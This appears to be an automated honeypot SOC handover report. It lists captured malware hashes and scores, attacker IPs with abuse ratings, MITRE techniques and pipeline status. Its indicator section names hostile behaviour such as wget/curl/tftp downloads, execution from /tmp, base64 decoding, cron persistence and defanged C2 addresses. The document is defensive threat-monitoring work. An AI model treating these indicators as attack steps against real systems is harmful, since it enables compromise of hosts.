| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `149.202.50[.]58` | FR | OVH SAS | **100** ⚠️ | 39 |
| `139.19.117[.]129` | DE | Max-Planck-Institut fuer Informatik | **100** ⚠️ | 0 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `66.132.195[.]50` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `201.205.241[.]198` | CR | CARRIZAL | **100** ⚠️ | 4 |
| `77.90.185[.]17` | LT | Limited Network LTD | **100** ⚠️ | 50 |
| `130.12.180[.]174` | DE | Virtualine Technologies | **100** ⚠️ | 50 |
| `193.90.12[.]122` | NO | GLOBALCONNECT AS | **100** ⚠️ | 50 |
| `217.60.255[.]130` | IR | SepehrSabz IDC | **100** ⚠️ | 4 |
| `66.132.195[.]121` | US | Censys, Inc. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 58 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 48 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 22 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 22 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 20 |

---

## 🔕 False Positive Summary (14 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 9 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 13 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 93 cases |
| Tool 34  | Credential Extractor        | ✅ 59 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 39 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 14 filtered (15.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 19 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 21 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 48 priority case(s) shown individually · 19 recon entry/entries in table (7 group(s) consolidating 19 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-09-06T16:47:23Z_
